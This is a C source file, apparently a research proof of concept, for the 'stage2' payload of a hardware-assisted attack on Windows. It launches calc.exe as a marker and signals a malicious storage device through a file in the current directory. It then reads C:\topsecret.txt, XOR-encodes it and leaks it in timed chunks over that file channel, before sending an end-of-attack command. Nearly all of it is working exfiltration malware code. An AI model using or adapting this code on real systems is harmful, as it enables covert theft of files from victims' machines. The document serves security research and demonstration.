/*
** MIT LICENSE
** Copyright <2020> <David Reguera Garcia aka Dreg> dreg@fr33project.org
** http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg
**
** Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
** associated documentation files (the "Software"), to deal in the Software without restriction,
** including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
** and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
** subject to the following conditions:
**
** The above copyright notice and this permission notice shall be included in all copies or substantial
** portions of the Software.
**
** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
** LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
** WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define EXFIL_STR "EXFSTG"

char curr_dir[MAX_PATH];
char cmdex[MAX_PATH * 2];

void ExfBlk(unsigned char* sect, unsigned int id, size_t chnk_sz)
{
	FILE* file;

	do
	{
		printf("trying open file to exfiltrating chunk.... 0x%x\n", id);
		file = fopen(cmdex, "rb+");
		if (NULL != file)
		{
			puts("exfiltrating block ....");
			fseek(file, 0L, SEEK_SET);
			fwrite(sect, chnk_sz, 1, file);
			fflush(file);
			fclose(file);

			break;
		}
		else
		{
			perror(cmdex);
			Sleep(3000);
		}
	} while (1);
}

#define ENDATTK_STR "ENDTTK"
void ConvertToOnlyMass(void)
{
	FILE* file;
	unsigned  char end_sect[512] = { 0 };

	strcpy(end_sect, ENDATTK_STR);

	do
	{
		printf("trying open file to end attack\n");
		file = fopen(cmdex, "rb+");
		if (NULL != file)
		{
			puts("converting to only mass storage ....");
			fseek(file, 0L, SEEK_SET);
			fwrite(end_sect, sizeof(end_sect), 1, file);
			fflush(file);
			fclose(file);

			break;
		}
		else
		{
			perror(cmdex);
			Sleep(3000);
		}
	} while (1);
}

int main(int argc, char* argv[])
{
	HANDLE hMutexHandle;

	puts("\n-\n"
		"stage2 (MIT LICENSE) by David Reguera Garcia aka Dreg - dreg@fr33project.org\n"
		"http://www.fr33project.org - https://github.com/David-Reguera-Garcia-Dreg\n"
		"syntax: stage2.exe\n"
		"examples: stage2.exe\n"
		"-\n");

	hMutexHandle = CreateMutexW(NULL, FALSE, L"roaptsdrgmlw");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 0;
	}

	GetCurrentDirectoryA(MAX_PATH, curr_dir);

	sprintf(cmdex, "%s\\g", curr_dir);

	puts(cmdex);

	system("calc.exe");

	FILE* file = NULL;
	FILE* hfile = NULL;
	unsigned char rdbf[3] = { 0 };
	do
	{
		puts("trying to start EXFILTRATE STAGE....");
		file = fopen(cmdex, "rb+");
		if (NULL != file)
		{
			fwrite(EXFIL_STR, sizeof(EXFIL_STR), 1, file);
			fflush(file);
			fclose(file);
			do
			{
				puts("checking if i am in EXFILTRATE STAGE...");
				hfile = fopen(cmdex, "rb");
				if (NULL != hfile)
				{
					fread(rdbf, 2, 1, hfile);
					if (rdbf[0] == 2 && rdbf[0] == 2)
					{
						puts("exfiltrate stage started!!");
						goto exfstg;
					}
					else
					{
						Sleep(3000);
					}
					fclose(hfile);
				}
				else
				{
					Sleep(3000);
				}
			} while (1);
		}
		else
		{
			perror(cmdex);
			Sleep(3000);
		}
	} while (1);

	exfstg:
	puts("\nexfiltrating info...");

	puts("trying open C:\\topsecret.txt");
	file = fopen("C:\\topsecret.txt", "rb");
	unsigned char readed_chunk[126];
	unsigned char* ptr_raw_st;
	unsigned char* ptr_raw_end = readed_chunk + sizeof(readed_chunk);
	unsigned int i = 0;
	unsigned int bytes_readed;
	if (NULL != file)
	{
		while (!feof(file))
		{
			memset(readed_chunk, 0, sizeof(readed_chunk));
			sprintf(readed_chunk, "0x%x ", i++);
			ptr_raw_st = readed_chunk + strlen(readed_chunk);
			bytes_readed = fread(ptr_raw_st, 1, sizeof(readed_chunk) - strlen(readed_chunk), file);
			if (bytes_readed == 0)
			{
				break;
			}
			while (ptr_raw_st != ptr_raw_end)
			{
				*ptr_raw_st ^= 0xAA;
				ptr_raw_st++;
			}
			ExfBlk(readed_chunk, i, sizeof(readed_chunk));
			Sleep(340000);

		}
		fclose(file);
	}
	else
	{
		perror("C:\\topsecret.txt");
	}

	puts("\ninfo exfiltrate!! end of attack... converting to only mass storage");
	Sleep(15000);
	ConvertToOnlyMass();

	puts("\nSUCCESS! good bye!!\n");

	puts("\nclosing in 10 secs...");
	Sleep(10000);


	return 0;
}